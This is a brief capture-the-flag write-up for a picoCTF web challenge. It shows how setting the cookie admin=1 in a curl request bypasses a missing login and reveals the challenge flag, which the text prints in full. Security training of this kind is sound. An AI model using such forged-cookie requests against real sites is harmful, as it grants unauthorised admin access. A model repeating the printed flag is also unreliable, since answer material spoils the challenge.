# No Login (web, 200pts)

> Looks like someone started making a website but never got around to making a login, but I heard there was a flag if
> you were the admin. http://2018shell.picoctf.com:33889

If you navigate to `/flag`, you get the message:

```
I'm sorry it doesn't look like you are the admin.
```

Since you can't login (or logout), the server is probably checking for either an admin cookie or query string parameter.

Set the cookie `admin=1;` and make a request - the flag is in the HTML output:

```
$ curl -H 'Cookie:admin=1;' http://2018shell.picoctf.com:33889/flag
...
<b>Flag</b>: <code>picoCTF{n0l0g0n_n0_pr0bl3m_26b0181a}</code>
```
